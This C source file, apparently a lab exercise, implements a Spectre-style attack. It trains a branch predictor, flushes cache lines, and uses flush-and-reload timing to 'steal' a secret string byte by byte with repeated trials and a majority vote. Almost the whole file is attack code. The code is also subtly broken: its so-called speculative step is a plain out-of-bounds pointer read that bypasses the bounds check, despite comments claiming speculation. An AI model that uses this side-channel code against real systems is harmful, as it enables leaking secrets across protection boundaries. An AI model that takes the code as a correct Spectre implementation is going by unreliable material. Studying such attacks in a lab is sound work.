#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <time.h>

#define CACHE_HIT_THRESHOLD 200    // For Chuck
#define ATTACK_ATTEMPTS     30     // Number of Spectre trials per byte

unsigned int bound_lower = 0;
unsigned int bound_upper = 9;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
char *secret = "Some Secret Value";

typedef struct datablock {
    uint8_t lpad[2048];   // Ensures dat is isolated
    uint8_t dat;
    uint8_t rpad[2047];   // Total size = 4096 bytes (1 page)
} DataBlock;

DataBlock array[256];

/* --- helper functions unchanged from Task 6 --- */

uint8_t restrictedAccess(size_t x) {
    if (x <= bound_upper && x >= bound_lower) {
        return buffer[x];
    } else {
        return 0;
    }
}

void flushSideChannel(void) {
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i].dat);
    }
}

uint8_t reloadSideChannel(void) {
    int aux = 0;
    uint64_t best_time = UINT64_MAX;
    int best_index = 0;

    for (int i = 255; i >= 0; i--) {
        volatile uint8_t *addr = &array[i].dat;
        uint64_t start = __rdtscp(&aux);
        aux = *addr;
        uint64_t end = __rdtscp(&aux);
        uint64_t delta = end - start;
        if (delta < best_time) {
            best_time = delta;
            best_index = i;
        }
    }

    if (best_time <= CACHE_HIT_THRESHOLD) {
        return (uint8_t)best_index;
    } else {
        return 0xFF;
    }
}

void spectreAttack(size_t larger_x) {
    uint8_t s;

    // Train predictor
    for (int i = 0; i < 10; i++) {
        restrictedAccess(i);
    }

    // Flush the bounds check and side-channel buffer
    _mm_clflush(&bound_upper);
    for (int i = 0; i < 256; i++) {
        _mm_clflush(&array[i].dat);
    }

    // Spectre: direct speculative access to secret byte
    volatile uint8_t *target = (uint8_t *)buffer + larger_x;
    s = *target;
    array[s].dat += 1;
}

void busy_wait(int delay) {
    for (volatile int i = 0; i < delay * 100000; i++) { }
}

/* --- Task 7: steal the entire secret string --- */

int main(void) {
    // 1) Initialize the probe array
    for (int i = 0; i < 256; i++) {
        array[i].dat = 1;
    }

    // 2) Compute the first out-of-bounds index for the secret
    size_t secret_offset = (size_t)((char*)secret - (char*)buffer);

    // 3) Assume we know the secret length = 17 characters
    const size_t secret_len = 17;

    // 4) Allocate space to store the stolen bytes
    char *stolen = malloc(secret_len + 1);
    if (!stolen) {
        perror("malloc");
        return 1;
    }

    fprintf(stderr, "Stealing %zu-byte secret starting at buffer+%zu\n",
            secret_len, secret_offset);

    // 5) For each byte in the secret...
    for (size_t pos = 0; pos < secret_len; pos++) {
        size_t current_offset = secret_offset + pos;

        // Tally hits for this byte
        int byte_counts[256] = {0};

        // 6) Run the Spectre attack multiple times
        for (int trial = 0; trial < ATTACK_ATTEMPTS; trial++) {
            flushSideChannel();
            spectreAttack(current_offset);
            uint8_t leak = reloadSideChannel();
            if (leak != 0xFF) {
                byte_counts[leak]++;
            }
            busy_wait(10);
        }

        // 7) Pick the value seen most often
        int peak_hits     = 0;
        int recovered_val = -1;
        for (int v = 0; v < 256; v++) {
            if (byte_counts[v] > peak_hits) {
                peak_hits     = byte_counts[v];
                recovered_val = v;
            }
        }

        // 8) Store it (or '?' on failure)
        stolen[pos] = (recovered_val >= 0) ? (char)recovered_val : '?';
    }

    // 9) Null-terminate and print
    stolen[secret_len] = '\0';
    printf("Stolen secret: %s\n", stolen);

    free(stolen);
    return 0;
}
